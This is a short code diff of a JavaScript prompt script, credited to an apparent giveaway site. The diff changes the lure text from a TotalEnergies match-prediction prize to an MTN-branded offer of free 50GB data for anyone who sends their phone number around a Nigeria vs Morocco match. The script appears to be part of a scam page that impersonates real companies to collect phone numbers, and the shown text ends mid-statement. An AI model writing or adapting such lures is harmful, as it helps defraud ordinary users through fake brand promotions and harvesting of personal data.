@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'GET 50GB'
 password = prompt(
-  'CAF: Predict the winner of the match between NIGERIA VS MOROCCO and win 50GB from TOTALENERGIES instantly after the match.',
+  'MTN: Send your number to get 50GB free data Imminently after the match Between Nigeria VS Morocco.',
   'GET 50GB'
 );
 if (password != 'GET 50GB') {
